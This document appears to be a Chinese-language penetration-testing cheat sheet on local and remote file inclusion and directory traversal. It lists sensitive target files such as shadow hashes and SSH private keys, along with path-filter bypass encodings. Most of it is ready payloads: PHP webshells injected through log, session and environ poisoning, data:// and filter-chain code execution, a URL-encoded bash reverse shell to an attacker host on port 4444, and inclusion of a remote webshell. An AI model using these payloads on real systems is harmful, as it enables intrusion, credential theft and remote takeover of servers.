# LFI / RFI / 目录遍历 详细参考

> 先判断 **包含引擎**，不要把 PHP filter chain 当所有栈的默认。

---

## 按栈

```text
PHP include/require     → filter / 日志投毒 / session / phar（见下）
只 readfile/file_get    → 读敏感文件，不能 RCE，配上传或配 SSRF
IIS                     → web.config、asp include、日志 C:\inetpub\logs
Java                    → WEB-INF/web.xml、properties、class 路径；JSP include
Tomcat                  → WEB-INF + 若可写 webapps 转 upload.md
```

PHP filter chain 仅当参数进入 `include/require`。判断：包含 `.php` 被执行 = include；只显示源码 = 只读。

---

## 目录遍历

### Linux高价值文件
```
/etc/passwd                            # 用户列表
/etc/shadow                            # 密码hash(需root)
/home/<user>/.ssh/id_rsa               # SSH私钥
/var/log/apache2/access.log            # Apache日志(日志投毒用)
/var/log/auth.log                      # 认证日志(SSH投毒用)
/var/www/html/                         # Web根目录
/proc/self/environ                     # 环境变量(投毒用)
/var/lib/php/sessions/sess_<PHPSESSID> # PHP session文件
```

### Windows高价值文件
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config          # IIS配置(连接字符串)
C:\inetpub\logs\LogFiles\W3SVC1\       # IIS日志
C:\xampp\apache\logs\                   # XAMPP Apache日志
```

### 绕过过滤
```
URL编码:         ../ → %2e%2e/  或 %2e%2e%2f
双重编码:        ../ → %252e%252e%252f
删除过滤绕过:    ....// → 删除中间../ 剩余 ../
curl保留斜杠:    curl --path-as-is
```

---

## LFI → RCE

### 1. 日志投毒（Apache）

```
# 1. 确认能读日志
?page=../../../../var/log/apache2/access.log

# 2. UA写马
User-Agent: <?php echo system($_GET['cmd']); ?>

# 3. 命令执行
?page=../../../../var/log/apache2/access.log&cmd=id

# 4. 反弹shell（URL编码）
&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F4444%200%3E%261%22
```

注意：PHP下需用 `bash -c "bash -i >& ..."` 包裹，因为PHP system()走的是sh而非bash。

### 2. SSH日志投毒（auth.log）

```
ssh "<?php echo shell_exec($_GET['cmd']); ?>"@TARGET
# 失败的登录会记录到 /var/log/auth.log
# 再通过LFI包含auth.log执行命令
```

### 3. /proc/self/environ 投毒

```
User-Agent: <?php system($_GET['c']); ?>
# 包含 /proc/self/environ → UA里的PHP代码被执行
```

### 4. PHP Session包含

```
# 先让session值包含PHP代码(如用户名输入框)
# 然后包含 /var/lib/php/sessions/sess_<PHPSESSID>
```

### 5. phpinfo竞争条件

上传临时文件 + phpinfo泄露临时文件路径 → 抢在PHP删除前包含它。

---

## PHP Wrapper

### php://filter（读源码）

```
# base64编码带出PHP源码
?page=php://filter/convert.base64-encode/resource=admin.php
echo "<base64>" | base64 -d    # 解码得源码(常含数据库密码)
```

### data://（代码执行）

需要 allow_url_include=On。

```
# 明文
?page=data://text/plain,<?php echo system('ls');?>

# base64（绕过过滤）
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=id
```

### PHP Filter Chain（现代首选，无需可写文件直接RCE）

```
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;;?>'
curl "http://TARGET/?page=php://filter/<生成的链>/resource=php://temp&0=id"
```

条件：完全控制include/require的参数。判断方法：能包含.php且被执行 = include。

### expect://（需expect扩展）

```
?page=expect://id
```

---

## RFI（远程文件包含）

需要 allow_url_include=On。

```
# 基础
?page=http://KALI/shell.php&cmd=id

# Kali放webshell
python3 -m http.server 80
```

### 绕过扩展名限制

```
# 服务端强制加.txt后缀时：
?page=http://KALI/shell.php%00.txt     # null截断(PHP<5.3)
?page=http://KALI/shell.php?.txt       # ?使后面变查询字符串
```
